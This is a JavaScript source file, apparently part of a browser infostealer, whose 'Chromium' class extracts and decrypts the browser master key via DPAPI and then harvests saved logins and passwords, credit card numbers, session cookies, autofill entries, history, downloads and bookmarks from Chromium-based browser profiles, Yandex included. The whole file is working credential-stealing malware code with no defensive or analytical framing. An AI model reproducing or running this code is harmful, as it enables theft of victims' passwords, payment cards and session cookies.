const fs = require("fs");
const path = require("path");

const cryptofy = require("./crypto.js");
const query = require("./query.js");
const structures = require("./structures");

const ALL_SITES_VISITEDS = [];

class Chromium {
    GetSites = () => ALL_SITES_VISITEDS;

    GetMasterKey = (chromiumPath) => {
        const localStatePath = path.join(chromiumPath, 'Local State')
        if (!fs.existsSync(localStatePath)) return null;
        try {
            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
            const encryptedKey = localState.os_crypt?.encrypted_key;
            if (!encryptedKey) return '';
            const decodedKeyBuffer = Buffer.from(encryptedKey, 'base64');
            const slicedKeyBuffer = decodedKeyBuffer.slice(5);
            const decryptedKey = cryptofy.DPAPI(slicedKeyBuffer, null, 'CurrentUser');
            return decryptedKey;
        } catch (error) {
            return null;
        }
    }

    GetDownloads = async (chromiumPathProfile) => {
        const HistoryFilePath = path.join(chromiumPathProfile, 'History');
        if (!fs.existsSync(HistoryFilePath)) return [];
        const sqliteQuery = new query.SqliteQuery(HistoryFilePath);
        try {
            const rows = await sqliteQuery.execute('SELECT target_path, tab_url, total_bytes FROM downloads');
            return rows.map(row => {
                return new structures.Download(
                    row.tab_url,
                    row.target_path,
                    row.total_bytes
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetHistorys = async (chromiumPathProfile) => {
        const HistoryFilePath = path.join(chromiumPathProfile, 'History');
        if (!fs.existsSync(HistoryFilePath)) return [];
        const sqliteQuery = new query.SqliteQuery(HistoryFilePath);
        try {
            const rows = await sqliteQuery.execute('SELECT url, title, visit_count, last_visit_time FROM urls');
            return rows.map(row => {
                return new structures.History(
                    row.url,
                    row.title,
                    row.visit_count,
                    row.last_visit_time
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetBookmarks = async (chromiumPathProfile) => {
        const BookmarksFilePath = path.join(chromiumPathProfile, 'Bookmarks');
        const BookmarksFileTempPath = path.join(chromiumPathProfile, 'Bookmarks.temp');
        if (!fs.existsSync(BookmarksFilePath)) return [];
        try {
            fs.copyFileSync(BookmarksFilePath, BookmarksFileTempPath);
            const bookmarksObjectJson = JSON.parse(fs.readFileSync(BookmarksFileTempPath, 'utf8'));
            return bookmarksObjectJson?.roots?.bookmark_bar?.children.map(bookmark => {
                return new structures.Bookmark(
                    bookmark.url,
                    bookmark.name,
                    bookmark.date_added
                )
            });
        } catch (error) {
            return [];
        } finally {
            if (fs.existsSync(BookmarksFileTempPath)) {
                try {
                    fs.unlinkSync(BookmarksFileTempPath);
                } catch (error) {
                }
            }
        }
    };

    GetAutofills = async (chromiumPathProfile) => {
        const WebDataFilePath = path.join(chromiumPathProfile, 'Web Data');
        if (!fs.existsSync(WebDataFilePath)) return [];
        const sqliteQuery = new query.SqliteQuery(WebDataFilePath);
        try {
            const rows = await sqliteQuery.execute('SELECT name, value FROM autofill');
            return rows.map(row => {
                return new structures.Autofill(
                    row.name,
                    row.value
                )
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetLogins = async (chromiumPathProfile, MasterKey) => {
        const LoginDataFilePath = chromiumPathProfile.includes("Yandex")
            ? path.join(chromiumPathProfile, 'Ya Passman Data')
            : path.join(chromiumPathProfile, 'Login Data');
        if (!fs.existsSync(LoginDataFilePath)) return [];
        const sqliteQuery = new query.SqliteQuery(LoginDataFilePath);
        try {
            const rows = await sqliteQuery.execute('SELECT origin_url, username_value, password_value, date_created FROM logins');
            return rows.map(row => {
                let password = row.password_value;
                try {
                    if (password.toString().startsWith("v10") || password.toString().startsWith("v11")) {
                        if (!MasterKey) return null;
                        password = cryptofy.decryptAES256GCM(MasterKey, password);
                    } else {
                        password = cryptofy.DPAPI(password, null, "CurrentUser");
                    }
                    if (row.username_value && password) {
                        ALL_SITES_VISITEDS.push(row.origin_url);
                        return new structures.Login(
                            row.origin_url,
                            row.username_value,
                            password,
                            row.date_created
                        );
                    }
                } catch (error) {
                    return null;
                }
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetCreditCards = async (chromiumPathProfile, MasterKey) => {
        const WebDataFilePath = path.join(chromiumPathProfile, 'Web Data');
        if (!fs.existsSync(WebDataFilePath)) return [];
        const sqliteQuery = new query.SqliteQuery(WebDataFilePath);
        try {
            const rows = await sqliteQuery.execute('SELECT guid, name_on_card, card_number_encrypted, billing_address_id, nickname, expiration_month, expiration_year FROM credit_cards');
            return rows.map(row => {
                let card_number = row.card_number_encrypted;
                try {
                    if (card_number.toString().startsWith("v10") || card_number.toString().startsWith("v11")) {
                        if (!MasterKey) return null;
                        card_number = cryptofy.decryptAES256GCM(MasterKey, card_number);
                    } else {
                        card_number = cryptofy.DPAPI(card_number, null, "CurrentUser");
                    }
                    return new structures.CreditCard(
                        row.guid,
                        row.name_on_card,
                        card_number,
                        row.billing_address_id,
                        row.nickname,
                        row.expiration_month,
                        row.expiration_year
                    );
                } catch (error) {
                    return null;
                }
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };

    GetCookies = async (chromiumPathProfile, MasterKey) => {
        const CookiesFilePath = path.join(chromiumPathProfile, 'Network', 'Cookies');
        if (!fs.existsSync(CookiesFilePath)) return [];
        const sqliteQuery = new query.SqliteQuery(CookiesFilePath);
        try {
            const rows = await sqliteQuery.execute('SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies');
            return rows.map(row => {
                let cookies = row.encrypted_value;
                try {
                    if (cookies.toString().startsWith("v10") || cookies.toString().startsWith("v11")) {
                        if (!MasterKey) return null;
                        cookies = cryptofy.decryptAES256GCM(MasterKey, cookies);
                    } else {
                        cookies = cryptofy.DPAPI(cookies, null, "CurrentUser");
                    }
                    structures.BrowserStatistics.addCookies({
                        host_key: row.host_key,
                        path: row.path,
                        is_secure: row.is_secure,
                        expires_utc: row.expires_utc,
                        name: row.name,
                        value: cookies
                    });
                    return new structures.Cookie(
                        row.host_key,
                        row.path,
                        row.is_secure,
                        row.expires_utc,
                        row.name,
                        cookies
                    );
                } catch (error) {
                    return null;
                }
            }).filter(Boolean);
        } catch (error) {
            return [];
        }
    };
}

module.exports = {
    Chromium,
}